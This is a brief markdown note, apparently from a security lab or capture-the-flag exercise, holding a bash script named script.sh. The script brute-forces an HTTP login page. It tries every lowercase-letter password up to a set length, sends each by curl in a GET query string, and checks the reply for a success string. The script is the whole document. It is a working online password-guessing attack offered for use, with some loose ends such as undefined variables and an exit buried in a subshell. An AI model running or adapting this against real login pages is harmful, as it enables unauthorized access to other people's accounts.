# Brute force
 --- script.sh  test all the comb a..z not number or special char

 ``` echo "=========================================="
echo "HTTP Brute Force - Letters Only"
echo "=========================================="
echo "Target URL: $URL"
echo "Username: $USERNAME"
echo "Max password length: $MAX_LENGTH"
echo "=========================================="

generate_passwords() {
    local length=$1
    if [ $length -eq 1 ]; then
        for c in {a..z}; do
            echo "$c"
        done
    else
        for c in {a..z}; do
            generate_passwords $((length - 1)) | while read rest; do
                echo "${c}${rest}"
            done
        done
    fi
}

test_password() {
    local password=$1
    local response=$(curl -s -X GET "${URL}?page=signin&username=${USERNAME}&password=${password}&Login=Login")
    
    # check if done 
    if echo "$response" | grep -q "$SUCCESS_STRING"; then
        echo ""
        echo "=========================================="
        echo "[+] PASSWORD FOUND: $password"
        echo "=========================================="
        exit 0
    fi
    
    return 1
}

# Main brute force
attempts=0
for length in $(seq 1 $MAX_LENGTH); do
    echo ""
    echo "[*] Trying passwords of length $length..."
    
    generate_passwords $length | while read password; do
        ((attempts++))
        echo -ne "Attempts: $attempts | Testing: $password\r"
        
        test_password "$password"
    done
done

echo ""
echo "[-] Password not found within max length $MAX_LENGTH"
```
